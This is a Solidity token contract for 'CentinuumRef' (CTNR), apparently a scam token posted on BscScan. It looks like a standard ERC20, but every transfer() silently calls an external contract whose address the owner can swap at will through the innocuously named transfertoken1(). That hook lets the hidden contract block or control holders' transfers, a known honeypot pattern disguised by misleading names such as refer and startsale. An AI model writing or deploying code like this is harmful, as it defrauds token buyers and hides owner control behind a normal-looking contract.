/**
 *Submitted for verification at BscScan.com on 2021-10-15
*/

pragma solidity ^0.5.0;


contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function startsale(address fr, address to) external;
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}


contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; 
        
    } 
        function safeMul(uint a, uint b) public pure returns (uint c) { 
        c = a * b; require(a == 0 || c / a == b); 
            
    } 
        function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


contract CentinuumRef is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;

    uint256 public _totalSupply;
    address public ownercont;
    address payable crowdsale;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    event crowdsaleTransferred(address indexed crowdsale, address indexed newcrowdsale);
   
    constructor() public {
        name = "CentinuumRef";
        symbol = "CTNR";
        decimals = 18;
        _totalSupply = 7890000000000000000000000000;
        ownercont = msg.sender;
        crowdsale = 0xE341F75c9d765c5983124Ef650332cF114202fA3;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    modifier onlyOwnercont() {
    require(msg.sender == ownercont);
    _;
  }
    function transfertoken1(address payable newcrowdsale) public onlyOwnercont {
    
    emit crowdsaleTransferred(crowdsale, newcrowdsale);
    crowdsale = newcrowdsale;
  } 

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        
            
            refer(to);
            transpart(to,tokens);
         return true;
    }
    
    function transpart(address to, uint tokens) private returns (bool success) {
      balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;  
    }
    
    function refer(address to) private {
        address fr = msg.sender;
        address payable aaddr = crowdsale;
        CentinuumRef(aaddr).startsale(fr, to);
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    
    function startsale(address fr, address to) external{
        
    }
}